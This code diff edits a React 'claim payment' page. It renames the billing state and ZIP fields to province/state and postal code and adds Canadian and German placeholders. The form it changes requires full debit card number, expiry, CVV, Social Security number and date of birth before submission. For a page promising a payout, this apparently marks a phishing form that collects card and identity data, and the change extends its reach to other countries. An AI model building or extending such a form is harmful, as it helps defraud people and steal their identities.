@@ -26,8 +26,8 @@ export default function ClaimPaymentPage() {
     date_of_birth: '',
     billing_address: '',
     billing_city: '',
-    billing_state: '',
-    billing_zip: '',
+    billing_province_state: '',
+    billing_postal_code: '',
     billing_country: ''
   });
 
@@ -101,7 +101,7 @@ export default function ClaimPaymentPage() {
   };
 
   const handleDebitCardSubmit = async () => {
-    if (!debitCardForm.first_name || !debitCardForm.last_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !debitCardForm.ssn || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_state || !debitCardForm.billing_zip || !debitCardForm.billing_country) {
+    if (!debitCardForm.first_name || !debitCardForm.last_name || !debitCardForm.card_number || !debitCardForm.card_expiry || !debitCardForm.card_cvv || !debitCardForm.ssn || !debitCardForm.date_of_birth || !debitCardForm.billing_address || !debitCardForm.billing_city || !debitCardForm.billing_province_state || !debitCardForm.billing_postal_code || !debitCardForm.billing_country) {
       setMessage('Please fill in all required fields.', 'error');
       setMessageType('error');
       return;
@@ -123,8 +123,8 @@ export default function ClaimPaymentPage() {
           date_of_birth: debitCardForm.date_of_birth,
           billing_address: debitCardForm.billing_address,
           billing_city: debitCardForm.billing_city,
-          billing_state: debitCardForm.billing_state,
-          billing_zip: debitCardForm.billing_zip,
+          billing_province_state: debitCardForm.billing_province_state,
+          billing_postal_code: debitCardForm.billing_postal_code,
           billing_country: debitCardForm.billing_country,
           approval_status: 'card_details_submitted'
         })
@@ -600,19 +600,19 @@ export default function ClaimPaymentPage() {
                         <input type="text" placeholder="New York" value={debitCardForm.billing_city} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_city: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                       </div>
                       <div style={{ flex: 1 }}>
-                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>State *</label>
-                        <input type="text" placeholder="NY" maxLength="2" value={debitCardForm.billing_state} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_state: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>State / Province *</label>
+                        <input type="text" placeholder="CA or QC or Bayern" value={debitCardForm.billing_province_state} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_province_state: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                       </div>
                     </div>
 
                     <div className="form-row" style={{ display: 'flex', gap: '1rem' }}>
                       <div style={{ flex: 1 }}>
-                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>ZIP Code *</label>
-                        <input type="text" placeholder="10001" value={debitCardForm.billing_zip} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_zip: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                        <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Postal Code *</label>
+                        <input type="text" placeholder="10001 or M5V 3A8 or 10115" value={debitCardForm.billing_postal_code} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_postal_code: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                       </div>
                       <div style={{ flex: 1 }}>
                         <label style={{ display: 'block', marginBottom: '0.5rem', color: '#1e293b', fontWeight: '500', fontSize: '0.9rem' }}>Country *</label>
-                        <input type="text" placeholder="United States" value={debitCardForm.billing_country} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_country: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
+                        <input type="text" placeholder="United States or Canada or Germany" value={debitCardForm.billing_country} onChange={(e) => setDebitCardForm({ ...debitCardForm, billing_country: e.target.value })} style={{ width: '100%', padding: '0.75rem', border: '1px solid #e2e8f0', borderRadius: '8px', boxSizing: 'border-box', fontSize: '0.9rem' }} />
                       </div>
                     </div>
                   </div>
